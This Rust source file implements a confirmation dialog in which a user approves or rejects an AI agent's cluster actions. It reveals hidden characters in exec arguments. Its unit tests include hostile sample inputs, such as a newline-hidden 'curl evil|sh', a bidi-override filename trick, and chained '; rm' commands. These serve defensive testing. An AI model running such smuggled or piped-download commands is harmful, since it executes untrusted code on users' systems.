//! The dialog that asks the user about an agent's mutating call or about a
//! right for the rest of its session (ADR 0005, human in the loop; #227).
//! Shown in the main window, one request at a time; no answer before the
//! timeout counts as a rejection. Revealing a Secret carries a warning that
//! cannot be missed. Notices (an agent wanted a value where revealing is
//! off) appear as notifications with a way to the context's settings.

use gpui_kit::component::button::{Button, ButtonVariants as _};
use gpui_kit::component::checkbox::Checkbox;
use gpui_kit::component::notification::Notification;
use gpui_kit::component::{ActiveTheme as _, Disableable as _, Sizable as _, WindowExt as _};
use gpui_kit::prelude::FluentBuilder as _;
use gpui_kit::*;
use kubach_i18n::t;
use kubach_mcp::{ConfirmationDecision, ConfirmationRequest, Grant, HelmCredentials, RequestKind};
use kubach_ui::measure;

use super::{AgentState, Notice, countdown, global, secret_dialog};
use crate::settings::{SettingsTarget, open_settings};

/// Shows pending confirmations and notices in `window` as they arrive.
/// Call once for the main window.
pub fn watch_confirmations<V: 'static>(window: &mut Window, cx: &mut Context<V>) {
    let Some(agent) = global(cx) else {
        return;
    };
    cx.observe_in(&agent, window, |_, agent, window, cx| {
        show_notices(&agent, window, cx);
        show_next(agent, window, cx)
    })
    .detach();
}

fn show_notices(agent: &Entity<AgentState>, window: &mut Window, cx: &mut App) {
    let notices = agent.update(cx, |state, _| state.take_notices());
    for Notice {
        title,
        context,
        message,
    } in notices
    {
        let notification = Notification::warning(message.to_string())
            .title(title.to_string())
            .action(move |_, _, _| {
                let context = context.clone();
                Button::new("agent-reveal-off-settings")
                    .small()
                    .outline()
                    .label(t!("agent-security-settings"))
                    .on_click(move |_, _, cx| {
                        open_settings(SettingsTarget::security(context.clone()), cx)
                    })
            });
        window.push_notification(notification, cx);
    }
}

/// The dialog title for `request`.
fn title(request: &ConfirmationRequest) -> String {
    match &request.kind {
        RequestKind::Grant {
            grant: Grant::Read { .. },
        } => t!("agent-title-read"),
        RequestKind::Grant {
            grant: Grant::Secret { .. },
        } => t!("agent-title-reveal"),
        RequestKind::Grant {
            grant: Grant::Modify { .. },
        } => t!("agent-title-modify"),
        RequestKind::Exec { .. } => t!("agent-title-exec"),
        RequestKind::PortForward { .. } => t!("agent-title-port-forward"),
        RequestKind::Access { .. } => t!("agent-title-access"),
        RequestKind::Helm { helm } => match helm.action {
            kubach_mcp::HelmAction::Install => t!("agent-title-helm-install"),
            kubach_mcp::HelmAction::Upgrade => t!("agent-title-helm-upgrade"),
            kubach_mcp::HelmAction::Rollback => t!("agent-title-helm-rollback"),
            kubach_mcp::HelmAction::Uninstall => t!("agent-title-helm-uninstall"),
        },
        RequestKind::ChartSource { .. } => t!("agent-title-chart-source"),
        RequestKind::UseContext { .. } => t!("agent-title-use-context"),
        RequestKind::Secret { secret } => secret_dialog::title(secret),
        RequestKind::Call | RequestKind::RevealBlocked { .. } => t!("agent-title-call"),
    }
}

/// A piece of an exec argument as the dialog shows it (#194).
#[derive(Clone, Debug, PartialEq, Eq)]
enum ArgPart {
    /// Shown as is.
    Text(String),
    /// Stands for characters that would be invisible or misleading
    /// (`\n`, `\t`, `␣` for a significant space, `\u{202E}`); drawn
    /// highlighted so it cannot pass for the argument's own text.
    Escape(String),
}

/// Marks a space that would otherwise not be seen.
const VISIBLE_SPACE: char = '␣';

/// `arg` split into text and spelled-out characters: control, invisible
/// and bidi characters always, non-ASCII spaces always, ASCII spaces when
/// leading, trailing or in a run (long runs push text out of sight).
fn arg_parts(arg: &str) -> Vec<ArgPart> {
    if arg.is_empty() {
        return vec![ArgPart::Escape(t!("agent-arg-empty"))];
    }
    let chars: Vec<char> = arg.chars().collect();
    let first_visible = chars.iter().position(|&c| c != ' ');
    let last_visible = chars.iter().rposition(|&c| c != ' ');
    let mut parts: Vec<ArgPart> = Vec::new();
    let mut push = |part: ArgPart| match (parts.last_mut(), part) {
        (Some(ArgPart::Text(text)), ArgPart::Text(more))
        | (Some(ArgPart::Escape(text)), ArgPart::Escape(more)) => text.push_str(&more),
        (_, part) => parts.push(part),
    };
    for (ix, &c) in chars.iter().enumerate() {
        let part = match c {
            '\n' => ArgPart::Escape("\\n".into()),
            '\t' => ArgPart::Escape("\\t".into()),
            '\r' => ArgPart::Escape("\\r".into()),
            ' ' => {
                let edge = first_visible.is_none_or(|first| ix < first)
                    || last_visible.is_none_or(|last| ix > last);
                let in_run = chars.get(ix + 1) == Some(&' ')
                    || ix.checked_sub(1).and_then(|prev| chars.get(prev)) == Some(&' ');
                if edge || in_run {
                    ArgPart::Escape(VISIBLE_SPACE.into())
                } else {
                    ArgPart::Text(" ".into())
                }
            }
            c if kubach_mcp::policy::hidden_in_command(c) || c.is_whitespace() => {
                ArgPart::Escape(format!("\\u{{{:04X}}}", u32::from(c)))
            }
            c => ArgPart::Text(c.into()),
        };
        push(part);
    }
    parts
}

/// The text of `parts` and the byte ranges of its escapes, for
/// [`StyledText::with_highlights`].
fn arg_text(parts: &[ArgPart]) -> (String, Vec<std::ops::Range<usize>>) {
    let mut text = String::new();
    let mut escapes = Vec::new();
    for part in parts {
        match part {
            ArgPart::Text(plain) => text.push_str(plain),
            ArgPart::Escape(shown) => {
                let start = text.len();
                text.push_str(shown);
                escapes.push(start..text.len());
            }
        }
    }
    (text, escapes)
}

/// `arg` with its escapes highlighted.
fn styled_arg(arg: &str, cx: &App) -> StyledText {
    let (text, escapes) = arg_text(&arg_parts(arg));
    let style = HighlightStyle {
        color: Some(cx.theme().warning),
        background_color: Some(cx.theme().warning.opacity(0.15)),
        ..HighlightStyle::default()
    };
    StyledText::new(text).with_highlights(escapes.into_iter().map(|range| (range, style)))
}

/// The exec command: every argument on its own numbered, wrapping line.
fn command_block(command: &[String], cx: &App) -> impl IntoElement + use<> {
    let theme = cx.theme();
    let bytes: usize = command.iter().map(String::len).sum();
    div()
        .id("confirm-command")
        .max_h(px(320.))
        .overflow_y_scroll()
        .flex()
        .flex_col()
        .gap_1()
        .p_2()
        .rounded_md()
        .bg(theme.muted)
        .text_xs()
        .child(div().text_color(theme.muted_foreground).child(t!(
            "agent-command-header",
            count = command.len(),
            bytes = bytes
        )))
        .children(command.iter().enumerate().map(|(ix, arg)| {
            div()
                .flex()
                .gap_2()
                .font_family(theme.mono_font_family.clone())
                .child(
                    div()
                        .w(px(24.))
                        .flex_shrink_0()
                        .text_color(theme.muted_foreground)
                        .child(ix.to_string()),
                )
                .child(
                    div()
                        .flex_1()
                        .min_w_0()
                        .text_color(theme.foreground)
                        .child(styled_arg(arg, cx)),
                )
        }))
}

fn show_next(agent: Entity<AgentState>, window: &mut Window, cx: &mut App) {
    let state = agent.read(cx);
    if let Some(shown) = state.shown {
        if state.pending_by_id(shown).is_some() {
            return;
        }
        // Timed out or answered elsewhere while shown.
        agent.update(cx, |state, _| state.shown = None);
        window.close_dialog(cx);
    }
    let Some((id, title, form)) = agent.read(cx).pending.front().map(|pending| {
        let form = matches!(
            &pending.request.kind,
            RequestKind::Secret { secret } if secret.op.takes_values()
        );
        (pending.id, title(&pending.request), form)
    }) else {
        return;
    };
    agent.update(cx, |state, _| state.shown = Some(id));
    window.activate_window();
    // Kubach's own form for Secret values (#230).
    if form {
        secret_dialog::open(agent, id, window, cx);
        return;
    }
    let view = cx.new(|cx| ConfirmView::new(agent.clone(), id, cx));
    window.open_dialog(cx, move |dialog, _, _| {
        dialog
            .title(title.clone())
            .w(px(640.))
            .overlay_closable(false)
            .keyboard(false)
            .close_button(false)
            .child(view.clone())
    });
}

struct ConfirmView {
    agent: Entity<AgentState>,
    id: u64,
    /// The user ticked "I understand" for the dangerous findings; the
    /// approve button waits for it (#194).
    acknowledged: bool,
    /// "Allow by default" on an access request (#15); off until the user
    /// ticks it.
    always: bool,
    /// "Run this helm call with my credentials" (#18); off until the user
    /// ticks it, and the approve button waits for it.
    as_user: bool,
    _observe: Subscription,
}

impl ConfirmView {
    fn new(agent: Entity<AgentState>, id: u64, cx: &mut Context<Self>) -> Self {
        let observe = cx.observe(&agent, |_, _, cx| cx.notify());
        Self {
            agent,
            id,
            acknowledged: false,
            always: false,
            as_user: false,
            _observe: observe,
        }
    }

    fn answer(&self, decision: ConfirmationDecision, window: &mut Window, cx: &mut App) {
        let id = self.id;
        self.agent
            .update(cx, |agent, cx| agent.resolve(id, decision, cx));
        window.close_dialog(cx);
    }
}

/// Width of the [`field`] labels: the widest of them all, so the values
/// line up in every language (#444).
fn label_width(window: &Window, cx: &App) -> Pixels {
    let labels = [
        t!("agent-field-agent"),
        t!("agent-field-context"),
        t!("agent-field-namespace"),
        t!("agent-field-right"),
        t!("agent-field-release"),
        t!("agent-field-chart"),
        t!("agent-field-version"),
        t!("agent-field-revision"),
        t!("agent-field-runs-as"),
        t!("agent-field-asks-for"),
        t!("agent-field-access-now"),
        t!("agent-field-tool"),
        t!("agent-field-session"),
    ];
    measure::label_column_width(
        labels.iter().map(String::as_str),
        measure::TEXT_SM,
        px(96.),
        px(180.),
        window,
        cx,
    )
}

fn field(
    label: String,
    value: impl Into<SharedString>,
    label_width: Pixels,
    cx: &App,
) -> impl IntoElement {
    div()
        .flex()
        .gap_2()
        .text_sm()
        .child(
            div()
                .w(label_width)
                .flex_shrink_0()
                .text_color(cx.theme().muted_foreground)
                .child(label),
        )
        .child(div().flex_1().min_w_0().child(value.into()))
}

/// A [`field`] with a muted remark under the value.
fn field_with_note(
    label: String,
    value: impl Into<SharedString>,
    note: String,
    label_width: Pixels,
    cx: &App,
) -> impl IntoElement {
    div()
        .flex()
        .gap_2()
        .text_sm()
        .child(
            div()
                .w(label_width)
                .flex_shrink_0()
                .text_color(cx.theme().muted_foreground)
                .child(label),
        )
        .child(
            div()
                .flex_1()
                .min_w_0()
                .flex()
                .flex_wrap()
                .gap_x_2()
                .child(value.into())
                .child(
                    div()
                        .text_xs()
                        .text_color(cx.theme().muted_foreground)
                        .child(note),
                ),
        )
}

/// The bordered block that must not be overlooked.
fn warning_block(
    title: String,
    lines: Vec<String>,
    color: Hsla,
    cx: &App,
) -> impl IntoElement + use<> {
    div()
        .flex()
        .flex_col()
        .gap_1()
        .p_2()
        .rounded_md()
        .border_1()
        .border_color(color)
        .text_sm()
        .child(
            div()
                .text_color(color)
                .font_weight(FontWeight::MEDIUM)
                .child(title),
        )
        .children(
            lines
                .into_iter()
                .map(|line| div().text_color(cx.theme().foreground).child(line)),
        )
}

impl Render for ConfirmView {
    fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        let label_width = label_width(window, cx);
        let theme = cx.theme().clone();
        let agent = self.agent.read(cx);
        let Some(pending) = agent.pending_by_id(self.id) else {
            return div().text_sm().child(t!("agent-no-longer-pending"));
        };
        let request = pending.request.clone();
        let left = countdown(pending.deadline);
        let queued = agent.pending.len().saturating_sub(1);
        let client_only = !request.mode.server_enforced();
        let grant = match &request.kind {
            RequestKind::Grant { grant } => Some(grant.clone()),
            _ => None,
        };
        let secret = matches!(grant, Some(Grant::Secret { .. }));
        // A Helm change (#418).
        let helm = match &request.kind {
            RequestKind::Helm { helm } => Some(helm.clone()),
            _ => None,
        };
        let source = matches!(
            request.kind,
            RequestKind::ChartSource { .. } | RequestKind::UseContext { .. }
        );
        // Access beyond the minimum (#15).
        let access = match &request.kind {
            RequestKind::Access { raise, current, .. } => Some((*raise, *current)),
            _ => None,
        };
        // Copying or deleting a Secret (#230).
        let secret_change = match &request.kind {
            RequestKind::Secret { secret } => Some(secret.clone()),
            _ => None,
        };
        let deleting = secret_change
            .as_ref()
            .is_some_and(|secret| secret.op == kubach_mcp::SecretOp::Delete);
        let degraded = agent.server_limits_warning(&request.session_id, &request.namespace);
        let degraded_shown = degraded.is_some();

        let details = match &request.kind {
            // Exec is a command, not a diff: no colors, every argument apart.
            RequestKind::Exec { command } => Some(command_block(command, cx).into_any_element()),
            _ => (grant.is_none()
                && access.is_none()
                && !source
                && !request.details.trim().is_empty())
            .then(|| {
                div()
                    .id("confirm-details")
                    .max_h(px(280.))
                    .overflow_y_scroll()
                    .p_2()
                    .rounded_md()
                    .bg(theme.muted)
                    .font_family(theme.mono_font_family.clone())
                    .text_xs()
                    .children(request.details.lines().map(|line| {
                        let color = if line.starts_with('+') && !line.starts_with("+++") {
                            theme.success
                        } else if line.starts_with('-') && !line.starts_with("---") {
                            theme.danger
                        } else {
                            theme.foreground
                        };
                        // Long lines wrap: nothing hides past the right edge.
                        div().text_color(color).child(line.to_owned())
                    }))
                    .into_any_element()
            }),
        };
        let dangerous = (!request.dangerous.is_empty()).then(|| {
            warning_block(
                t!("agent-dangerous-title"),
                request
                    .dangerous
                    .iter()
                    .map(|finding| {
                        let (message, path) = (finding.message.as_str(), finding.path.as_str());
                        // What it does first (`manifest reads Secret db`),
                        // then where (#190).
                        match finding.document {
                            Some(doc) => t!(
                                "agent-dangerous-line-document",
                                message = message,
                                document = doc + 1,
                                path = path
                            ),
                            None => t!("agent-dangerous-line", message = message, path = path),
                        }
                    })
                    .collect(),
                theme.danger,
                cx,
            )
        });
        let needs_ack = dangerous.is_some();
        let has_dangerous = needs_ack || secret || deleting;
        let acknowledge = needs_ack.then(|| {
            Checkbox::new("confirm-acknowledge")
                .label(t!("agent-acknowledge"))
                .checked(self.acknowledged)
                .on_click(cx.listener(|this, checked: &bool, _, cx| {
                    this.acknowledged = *checked;
                    cx.notify();
                }))
        });
        // Helm under the user's own credentials (#18): the question with an
        // unticked box, or the warning once allowed.
        let credentials = helm
            .as_ref()
            .map(|helm| helm.credentials)
            .unwrap_or_default();
        let ask_user = credentials == HelmCredentials::AskUser;
        let as_user_block = helm.as_ref().and_then(|helm| match helm.credentials {
            HelmCredentials::Session => None,
            HelmCredentials::AskUser => Some(warning_block(
                t!("agent-helm-as-user-title"),
                [
                    t!("agent-helm-as-user-warning"),
                    t!("agent-helm-as-user-objects"),
                ]
                .into_iter()
                .chain(
                    helm.user_objects
                        .iter()
                        .map(|object| format!("  - {object}")),
                )
                .collect(),
                theme.danger,
                cx,
            )),
            HelmCredentials::User => Some(warning_block(
                t!("agent-helm-runs-as-user-title"),
                vec![t!("agent-helm-runs-as-user")],
                theme.danger,
                cx,
            )),
        });
        let as_user_tick = ask_user.then(|| {
            Checkbox::new("confirm-as-user")
                .label(t!("agent-helm-as-user-tick"))
                .checked(self.as_user)
                .on_click(cx.listener(|this, checked: &bool, _, cx| {
                    this.as_user = *checked;
                    cx.notify();
                }))
        });
        let has_dangerous = has_dangerous || credentials != HelmCredentials::Session;
        let approve_blocked = (needs_ack && !self.acknowledged) || (ask_user && !self.as_user);
        // What a yes to a right means; for a Secret, the warning.
        let meaning = grant.as_ref().map(|_| {
            if secret {
                warning_block(
                    t!("agent-secret-leaves"),
                    vec![request.details.clone(), t!("agent-secret-no-take-back")],
                    theme.danger,
                    cx,
                )
                .into_any_element()
            } else {
                div()
                    .text_sm()
                    .text_color(theme.muted_foreground)
                    .child(request.details.clone())
                    .into_any_element()
            }
        });
        let always = self.always;
        let (reject, approve) = match (&grant, &secret_change) {
            _ if access.is_some() && always => (t!("agent-deny"), t!("agent-allow-always")),
            _ if access.is_some() => (t!("agent-deny"), t!("agent-allow-session")),
            _ if source => (t!("agent-deny"), t!("agent-allow-session")),
            _ if helm.is_some() => (
                t!("agent-reject"),
                match helm.as_ref().map(|helm| helm.action) {
                    // A yes leads to the dry run first, not the change (#18).
                    Some(kubach_mcp::HelmAction::Install | kubach_mcp::HelmAction::Upgrade)
                        if ask_user =>
                    {
                        t!("agent-helm-dry-run-as-user")
                    }
                    Some(kubach_mcp::HelmAction::Install) => t!("agent-helm-install"),
                    Some(kubach_mcp::HelmAction::Upgrade) => t!("agent-helm-upgrade"),
                    Some(kubach_mcp::HelmAction::Rollback) => t!("agent-helm-rollback"),
                    _ => t!("agent-helm-uninstall"),
                },
            ),
            (Some(Grant::Secret { .. }), _) => (t!("agent-dont-reveal"), t!("agent-reveal")),
            (Some(_), _) => (t!("agent-deny"), t!("agent-allow-session")),
            (None, Some(_)) if deleting => (t!("agent-keep-secret"), t!("agent-delete-secret")),
            (None, Some(_)) => (t!("agent-reject"), t!("agent-copy-secret")),
            (None, None) => (t!("agent-reject"), t!("agent-approve")),
        };
        let secret_parts = secret_change.as_ref().map(|secret| {
            div()
                .flex()
                .flex_col()
                .gap_2()
                .child(secret_dialog::target(&request, cx))
                .child(secret_dialog::agent_says(secret, cx))
                .children(secret_dialog::users(secret, cx))
        });

        div()
            .flex()
            .flex_col()
            .gap_3()
            .children(secret_parts)
            .child(
                div()
                    .text_sm()
                    .font_weight(FontWeight::MEDIUM)
                    .child(request.summary.clone()),
            )
            .child(
                div()
                    .flex()
                    .flex_col()
                    .gap_1()
                    .child(field_with_note(
                        t!("agent-field-agent"),
                        request.client.clone(),
                        t!("agent-client-unverified"),
                        label_width,
                        cx,
                    ))
                    .when(!request.context.is_empty(), |this| {
                        this.child(field(
                            t!("agent-field-context"),
                            request.context.clone(),
                            label_width,
                            cx,
                        ))
                    })
                    .child(field(
                        t!("agent-field-namespace"),
                        request.namespace.clone(),
                        label_width,
                        cx,
                    ))
                    .when_some(grant.as_ref(), |this, grant| {
                        this.child(field(
                            t!("agent-field-right"),
                            grant.to_string(),
                            label_width,
                            cx,
                        ))
                    })
                    .when_some(helm.as_ref(), |this, helm| {
                        this.child(field(
                            t!("agent-field-release"),
                            helm.release.clone(),
                            label_width,
                            cx,
                        ))
                        .child(field(
                            t!("agent-field-chart"),
                            helm.chart.clone(),
                            label_width,
                            cx,
                        ))
                        .when_some(helm.version.clone(), |this, version| {
                            this.child(field(t!("agent-field-version"), version, label_width, cx))
                        })
                        .when_some(helm.revision, |this, revision| {
                            this.child(field(
                                t!("agent-field-revision"),
                                revision.to_string(),
                                label_width,
                                cx,
                            ))
                        })
                        .child(field(
                            t!("agent-field-runs-as"),
                            helm.identity.clone(),
                            label_width,
                            cx,
                        ))
                    })
                    .when_some(access, |this, (raise, current)| {
                        this.child(field(
                            t!("agent-field-asks-for"),
                            super::raise_label(raise),
                            label_width,
                            cx,
                        ))
                        .child(field(
                            t!("agent-field-access-now"),
                            super::access_label(current),
                            label_width,
                            cx,
                        ))
                    })
                    .child(field(
                        t!("agent-field-tool"),
                        request.tool.clone(),
                        label_width,
                        cx,
                    ))
                    .child(field(
                        t!("agent-field-session"),
                        request.session_id.clone(),
                        label_width,
                        cx,
                    )),
            )
            .children(meaning)
            .when(source, |this| {
                this.child(
                    div()
                        .text_sm()
                        .text_color(theme.muted_foreground)
                        .child(request.details.clone()),
                )
            })
            .when_some(helm.as_ref(), |this, helm| {
                let block = |id: &'static str, title: String, text: String| {
                    div()
                        .flex()
                        .flex_col()
                        .gap_1()
                        .child(
                            div()
                                .text_xs()
                                .text_color(theme.muted_foreground)
                                .child(title),
                        )
                        .child(
                            div()
                                .id(id)
                                .max_h(px(160.))
                                .overflow_y_scroll()
                                .p_2()
                                .rounded_md()
                                .bg(theme.muted)
                                .font_family(theme.mono_font_family.clone())
                                .text_xs()
                                .text_color(theme.foreground)
                                .child(text),
                        )
                };
                this.when(!helm.values.trim().is_empty(), |this| {
                    this.child(block(
                        "confirm-helm-values",
                        t!("agent-helm-values"),
                        helm.values.clone(),
                    ))
                })
                .when(!helm.objects.is_empty(), |this| {
                    this.child(block(
                        "confirm-helm-objects",
                        t!("agent-helm-objects"),
                        helm.objects.join("\n"),
                    ))
                })
            })
            .when(access.is_some(), |this| {
                this.child(div().text_sm().text_color(theme.muted_foreground).child(t!(
                    "agent-access-details",
                    context = request.context.as_str()
                )))
                .child(
                    div()
                        .flex()
                        .flex_col()
                        .gap_1()
                        .child(
                            Checkbox::new("confirm-always")
                                .label(t!("agent-always"))
                                .checked(always)
                                .on_click(cx.listener(|this, checked: &bool, _, cx| {
                                    this.always = *checked;
                                    cx.notify();
                                })),
                        )
                        .child(
                            div()
                                .text_xs()
                                .text_color(if always {
                                    theme.warning
                                } else {
                                    theme.muted_foreground
                                })
                                .child(t!("agent-always-note", context = request.context.as_str())),
                        ),
                )
            })
            .when_some(degraded, |this, warning| {
                this.child(warning_block(
                    t!("agent-limits-off"),
                    vec![warning, t!("agent-limits-off-note")],
                    theme.warning,
                    cx,
                ))
            })
            .when(client_only && !degraded_shown, |this| {
                this.child(
                    div()
                        .text_xs()
                        .text_color(theme.warning)
                        .child(t!("agent-client-only")),
                )
            })
            .children(as_user_block)
            .children(as_user_tick)
            .children(dangerous)
            .children(acknowledge)
            .children(details)
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap_2()
                    .child(
                        div()
                            .flex_1()
                            .text_xs()
                            .text_color(theme.muted_foreground)
                            .child(if queued > 0 {
                                t!("agent-auto-reject-queued", left = left, queued = queued)
                            } else {
                                t!("agent-auto-reject", left = left)
                            }),
                    )
                    .child(
                        Button::new("confirm-reject")
                            .outline()
                            .small()
                            .label(reject)
                            .on_click(cx.listener(|this, _, window, cx| {
                                this.answer(
                                    ConfirmationDecision::Rejected {
                                        reason: Some("rejected by the user".into()),
                                    },
                                    window,
                                    cx,
                                )
                            })),
                    )
                    .child(
                        Button::new("confirm-approve")
                            .small()
                            .label(approve)
                            .disabled(approve_blocked)
                            .map(|button| {
                                if has_dangerous {
                                    button.danger()
                                } else {
                                    button.primary()
                                }
                            })
                            .on_click(cx.listener(move |this, _, window, cx| {
                                if approve_blocked {
                                    return;
                                }
                                let decision = if this.always {
                                    ConfirmationDecision::ApprovedAlways
                                } else {
                                    ConfirmationDecision::Approved
                                };
                                this.answer(decision, window, cx)
                            })),
                    ),
            )
    }
}

#[cfg(test)]
mod tests {
    use super::{ArgPart, VISIBLE_SPACE, arg_parts, arg_text};

    fn text(s: &str) -> ArgPart {
        ArgPart::Text(s.into())
    }

    fn escape(s: &str) -> ArgPart {
        ArgPart::Escape(s.into())
    }

    fn shown(arg: &str) -> String {
        arg_text(&arg_parts(arg)).0
    }

    #[test]
    fn plain_arguments_stay_as_they_are() {
        assert_eq!(arg_parts("ls"), [text("ls")]);
        assert_eq!(
            arg_parts("cat /etc/os-release; id"),
            [text("cat /etc/os-release; id")]
        );
        assert_eq!(arg_parts("привет 世界"), [text("привет 世界")]);
        assert_eq!(arg_parts(""), [escape("(empty)")]);
    }

    #[test]
    fn line_breaks_and_tabs_are_spelled_out() {
        assert_eq!(
            arg_parts("ls -la\n\n; curl evil|sh"),
            [text("ls -la"), escape("\\n\\n"), text("; curl evil|sh")]
        );
        assert_eq!(arg_parts("a\tb"), [text("a"), escape("\\t"), text("b")]);
        assert_eq!(shown("a\r\nb"), "a\\r\\nb");
    }

    #[test]
    fn invisible_and_bidi_characters_are_spelled_out() {
        assert_eq!(
            arg_parts("ls\u{202E}hs.lave"),
            [text("ls"), escape("\\u{202E}"), text("hs.lave")]
        );
        assert_eq!(shown("a\u{200B}b"), "a\\u{200B}b");
        assert_eq!(shown("\x1b[2K"), "\\u{001B}[2K");
        assert_eq!(shown("\u{7f}"), "\\u{007F}");
        assert_eq!(shown("a\u{2066}b\u{2069}"), "a\\u{2066}b\\u{2069}");
        // Spaces that are not ASCII spaces.
        assert_eq!(shown("a\u{00A0}b\u{3000}"), "a\\u{00A0}b\\u{3000}");
    }

    #[test]
    fn edge_and_repeated_spaces_are_visible() {
        let s = VISIBLE_SPACE.to_string();
        assert_eq!(arg_parts("echo hi"), [text("echo hi")]);
        assert_eq!(
            arg_parts("ls "),
            [text("ls"), escape(&s)],
            "a trailing space"
        );
        assert_eq!(arg_parts(" ls"), [escape(&s), text("ls")]);
        assert_eq!(
            arg_parts("ls   ; rm"),
            [text("ls"), escape(&s.repeat(3)), text("; rm")]
        );
        assert_eq!(arg_parts("  "), [escape(&s.repeat(2))]);
    }

    #[test]
    fn escape_ranges_point_at_the_escapes() {
        let (shown, ranges) = arg_text(&arg_parts("a\nb "));
        assert_eq!(shown, format!("a\\nb{VISIBLE_SPACE}"));
        let escaped: Vec<&str> = ranges.iter().map(|r| &shown[r.clone()]).collect();
        assert_eq!(escaped, ["\\n", &VISIBLE_SPACE.to_string()]);
    }
}
